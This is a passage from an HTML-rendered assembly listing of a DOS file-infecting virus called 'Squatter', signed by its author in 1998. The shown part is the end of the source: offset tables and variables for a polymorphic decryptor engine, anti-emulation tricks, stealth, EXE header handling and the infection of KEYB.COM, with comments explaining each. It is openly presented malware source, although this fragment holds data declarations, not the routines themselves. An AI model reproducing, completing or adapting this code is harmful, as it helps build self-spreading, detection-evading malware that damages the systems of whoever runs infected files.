        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Basura9</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Basura10</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Basura11</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Basura12</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Basura13</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Basura14</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Basura15</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Basura16</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Basura17</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Atributos</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">BytesInt24h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">ByteInt1Bh</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">WordAleatorio1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">

</span><span class="sc1">;; Virus arrives until here! Beyond this point the variables only exist in</span><span class="sc0">
</span><span class="sc1">;; memory, when it's installed.</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FinVirus</span><span class="sc0">    </span><span class="sc9">LABEL</span><span class="sc0">   </span><span class="sc10">WORD</span><span class="sc0">   </span><span class="sc1">; Mark of end of the spreading part of the virus</span><span class="sc0">

</span><span class="sc5">Ptr01</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; Here we save the int 01h vector when we use it</span><span class="sc0">
                  </span><span class="sc1">; to trace, when int 30h trick fails</span><span class="sc0">

</span><span class="sc5">DirecDTA</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; To save DTA address</span><span class="sc0">
</span><span class="sc5">FakedHandle</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; To save faked handle, when we fake</span><span class="sc0">
                      </span><span class="sc1">; it</span><span class="sc0">
</span><span class="sc5">EstadoInt24h</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; To set on if there was a critic</span><span class="sc0">
                      </span><span class="sc1">; error</span><span class="sc0">
</span><span class="sc5">AntHandle</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; Exchange variable for the "Fake-</span><span class="sc0">
                      </span><span class="sc1">; Handle" routine</span><span class="sc0">
</span><span class="sc5">SumaNombre</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; Checksum of the name of the file</span><span class="sc0">
                      </span><span class="sc1">; infected before</span><span class="sc0">
</span><span class="sc5">NoStealth</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; If it's set, stealth doesn't work</span><span class="sc0">
                      </span><span class="sc1">; It's to avoid stealth when certain</span><span class="sc0">
                      </span><span class="sc1">; files are executed</span><span class="sc0">
</span><span class="sc5">PrimerByte</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; Set on if we are constructing the</span><span class="sc0">
                      </span><span class="sc1">; first instruction in one of the</span><span class="sc0">
                      </span><span class="sc1">; two decryptors in the poly engine</span><span class="sc0">
</span><span class="sc5">Cabecera</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; To save EXE header</span><span class="sc0">
</span><span class="sc5">Cabecera2</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; To have a duplicate of EXE header</span><span class="sc0">
</span><span class="sc5">NombreFCB</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0Ch</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; To pass a FCB's file name to a</span><span class="sc0">
                        </span><span class="sc1">; handle-function type, to use han-</span><span class="sc0">
                        </span><span class="sc1">; dle virus' functions with FCBs</span><span class="sc0">
</span><span class="sc5">AntiEmulacion</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; To store the number of anti-emula-</span><span class="sc0">
                      </span><span class="sc1">; tion routine used in the first de-</span><span class="sc0">
                      </span><span class="sc1">; cryptor constructed by the poly</span><span class="sc0">
                      </span><span class="sc1">; engine, to not repeat the same in</span><span class="sc0">
                      </span><span class="sc1">; the second decryptor</span><span class="sc0">
</span><span class="sc5">RegistroEncriptado</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; To store the key register for decrypt</span><span class="sc0">
</span><span class="sc5">RegistroIndice</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; To store the index register</span><span class="sc0">
</span><span class="sc5">RegistroContador</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; To store the counter register</span><span class="sc0">
</span><span class="sc5">InicLoop</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; To store the address of start of decrypt</span><span class="sc0">
                     </span><span class="sc1">; loop</span><span class="sc0">
</span><span class="sc5">Temporal</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; To store address of jump instruction</span><span class="sc0">
                     </span><span class="sc1">; when constructing a random jump</span><span class="sc0">
</span><span class="sc5">TamanyoContador</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; Size of block for decrypt</span><span class="sc0">
</span><span class="sc5">SumaIndice</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; Quantity that must be added to index</span><span class="sc0">
                     </span><span class="sc1">; relatively in the instruction to point</span><span class="sc0">
                     </span><span class="sc1">; correctly to the beginning of the en-</span><span class="sc0">
                     </span><span class="sc1">; crypted block</span><span class="sc0">
</span><span class="sc5">WordEncriptado</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; Key of decryption</span><span class="sc0">
</span><span class="sc5">LongDesencrip</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; Size of the first decryptor that the</span><span class="sc0">
                     </span><span class="sc1">; poly engine builds</span><span class="sc0">
</span><span class="sc5">Estado</span><span class="sc0">          </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; Multi-function variable :)</span><span class="sc0">
</span><span class="sc5">WordCambio</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; Quantity to be ADDed, SUBtracted or</span><span class="sc0">
                     </span><span class="sc1">; XORed to decryption key every loop</span><span class="sc0">
</span><span class="sc5">EstoyDentro</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; If it's set on, we're constructing the</span><span class="sc0">
                     </span><span class="sc1">; decryption loop (we're inside the loop)</span><span class="sc0">
</span><span class="sc5">Banderas</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; Flags of the built decryptor (normally</span><span class="sc0">
                     </span><span class="sc1">; in BP)</span><span class="sc0">
</span><span class="sc5">Desinfeccion</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; Counter to determine if we must disin-</span><span class="sc0">
                     </span><span class="sc1">; fect host, infect KEYB.COM or infect</span><span class="sc0">
                     </span><span class="sc1">; normally</span><span class="sc0">
</span><span class="sc5">InstalacionPoli</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; If it's 0, the random seed will be ini-</span><span class="sc0">
                     </span><span class="sc1">; tialize. If not, it won't :)</span><span class="sc0">
</span><span class="sc5">AntAleatorio</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; When the random seed is initiali-</span><span class="sc0">
                     </span><span class="sc1">; zed, the result is saved here, so every</span><span class="sc0">
                     </span><span class="sc1">; time we call to "HazVirus" to generate</span><span class="sc0">
                     </span><span class="sc1">; a new virus, the random seed is set with</span><span class="sc0">
                     </span><span class="sc1">; this values. In this manner the decryp-</span><span class="sc0">
                     </span><span class="sc1">; tor is always the same until you reboot</span><span class="sc0">
                     </span><span class="sc1">; the computer, otherwise you could chan-</span><span class="sc0">
                     </span><span class="sc1">; ge the decryptor setting a new date</span><span class="sc0">
</span><span class="sc5">LoopYaEsta</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; This variable is set when we finished</span><span class="sc0">
                     </span><span class="sc1">; constructing the decryption loop</span><span class="sc0">
</span><span class="sc5">NumeroCALLs</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; Here we store the number of constructed</span><span class="sc0">
                     </span><span class="sc1">; CALLs in the decryptors</span><span class="sc0">
</span><span class="sc5">DirecCALLs</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">08h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; Here the addresses where they</span><span class="sc0">
                        </span><span class="sc1">; are located.</span><span class="sc0">

</span><span class="sc5">NewVirus</span><span class="sc0">    </span><span class="sc9">LABEL</span><span class="sc0">   </span><span class="sc10">WORD</span><span class="sc0">         </span><span class="sc1">; Direction where the polimorphism engine</span><span class="sc0">
                     </span><span class="sc1">; will construct the virus</span><span class="sc0">

        </span><span class="sc9">END</span><span class="sc0"> </span><span class="sc5">Squatter</span><span class="sc0">     </span><span class="sc1">; Finish program</span><span class="sc0">

</span><span class="sc1">;; The Mental Driller, 24/7/1998 (when I finished comments! :)  )</span><span class="sc0">
</span></div></body>
</html>
